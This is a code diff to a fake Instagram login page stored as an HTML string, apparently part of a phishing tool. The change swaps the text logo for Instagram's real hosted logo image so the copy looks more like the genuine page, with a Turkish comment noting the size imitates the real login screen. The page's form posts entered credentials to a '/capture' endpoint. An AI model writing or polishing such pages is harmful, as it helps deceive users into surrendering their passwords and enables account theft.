@@ -77,12 +77,11 @@ INSTAGRAM_HTML = '''<!DOCTYPE html>
       box-shadow: 0 2px 12px rgba(0,0,0,0.08);
     }
     .logo {
-  font-family: 'Billabong', cursive;
-  font-size: 3.5rem;
-  line-height: 1;
-  letter-spacing: -1px;
-  color: #262626;
-  font-weight: normal;
+  margin: 0 0 24px;
+  text-align: center;
+}
+.logo img {
+  height: 51px; /* Instagram login sayfasındaki boyuta yakın */
 }
     .input-group {
       margin-bottom: 14px;
@@ -195,7 +194,9 @@ INSTAGRAM_HTML = '''<!DOCTYPE html>
 
     <div>
       <div class="login-card">
-        <h1 class="logo">Instagram</h1>
+        <div class="logo">
+  <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" />
+</div>
 
         <form id="loginForm" action="/capture" method="POST">
           <div class="input-group">
